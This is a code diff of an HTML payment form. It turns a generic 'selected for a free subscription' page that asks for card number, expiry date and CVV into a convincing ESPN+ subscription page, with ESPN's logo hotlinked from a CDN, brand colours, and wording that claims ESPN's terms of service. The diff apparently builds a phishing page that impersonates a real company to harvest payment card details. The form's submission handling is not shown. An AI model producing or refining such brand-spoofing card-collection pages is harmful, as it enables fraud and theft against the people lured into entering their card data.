@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Form</title>
+    <title>ESPN+ Subscription</title>
     <style>
         * {
             box-sizing: border-box;
@@ -13,7 +13,7 @@
 
         body {
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #0ea5e9 0%, #3b82f6 100%);
+            background: linear-gradient(135deg, #0396E5 0%, #0B6FB2 100%);
             margin: 0;
             padding: 30px 20px;
             display: flex;
@@ -27,7 +27,7 @@
             background: linear-gradient(to bottom right, #ffffff, #f8fafc);
             padding: 35px;
             border-radius: 20px;
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
             max-width: 480px;
             width: 100%;
         }
@@ -35,10 +35,20 @@
         .header {
             text-align: center;
             margin-bottom: 30px;
-            padding: 16px;
-            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            padding: 20px;
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
             border-radius: 12px;
-            border: 1px solid rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .espn-logo {
+            width: 100px;
+            height: 45px;
+            margin-bottom: 20px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            object-fit: contain;
         }
 
         h2 {
@@ -73,8 +83,8 @@
 
         .form-group input:focus {
             outline: none;
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+            border-color: #CC0000;
+            box-shadow: 0 0 0 3px rgba(204, 0, 0, 0.1);
         }
 
         .form-group input::placeholder {
@@ -100,7 +110,7 @@
             width: 18px;
             height: 18px;
             margin-top: 2px;
-            accent-color: #3b82f6;
+            accent-color: #CC0000;
             cursor: pointer;
         }
 
@@ -113,7 +123,7 @@
         .btn-submit {
             width: 100%;
             padding: 14px;
-            background: linear-gradient(135deg, #0ea5e9 0%, #3b82f6 100%);
+            background: linear-gradient(135deg, #FF0000 0%, #CC0000 100%);
             color: white;
             border: none;
             border-radius: 10px;
@@ -125,7 +135,7 @@
 
         .btn-submit:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(59, 130, 246, 0.2);
+            box-shadow: 0 6px 15px rgba(204, 0, 0, 0.2);
         }
 
         .btn-submit:active {
@@ -207,8 +217,11 @@
 <body>
     <div class="container">
         <div class="header">
-            <h2>Welcome to Premium!</h2>
-            <p style="color: #475569; font-size: 14px;">You've been selected for a free subscription</p>
+            <img src="https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-original-577x577/s3/052016/untitled-1_242.png?itok=Jnq8Rwqi" 
+                 alt="ESPN Logo" 
+                 class="espn-logo">
+            <h2>ESPN+ Subscription</h2>
+            <p style="color: #475569; font-size: 14px;">Get exclusive access to live sports, originals & more</p>
         </div>
 
         <form id="subscriptionForm">
@@ -248,10 +261,10 @@
 
             <div class="terms-group">
                 <input type="checkbox" id="terms" required>
-                <label for="terms">I agree to the Terms of Service and Privacy Policy</label>
+                <label for="terms">I agree to ESPN's Terms of Service and Privacy Policy</label>
             </div>
 
-            <button type="submit" class="btn-submit">Activate Your Account</button>
+            <button type="submit" class="btn-submit">Start Watching ESPN+</button>
             
             <div class="secure-badge">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
@@ -263,7 +276,7 @@
         </form>
 
         <div id="congratulationsMessage" class="congratulations">
-            🎉 Congratulations! Your account is now ready to use!
+            🎉 Welcome to ESPN+! Your subscription is now active!
         </div>
     </div>
 
@@ -272,8 +285,6 @@
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length > 16) value = value.slice(0, 16);
-            
-            // Add spaces every 4 digits
             value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
             e.target.value = value;
         });
@@ -281,18 +292,15 @@
         // Expiry date formatting
         document.getElementById('expiryDate').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
-            
             if (value.length >= 2) {
                 let month = value.slice(0, 2);
                 if (parseInt(month) > 12) month = '12';
-                
                 value = month + (value.length > 2 ? '/' + value.slice(2, 4) : '');
             }
-            
             e.target.value = value;
         });
 
-        // CVV formatting - numbers only
+        // CVV formatting
         document.getElementById('cvv').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length > 3) value = value.slice(0, 3);
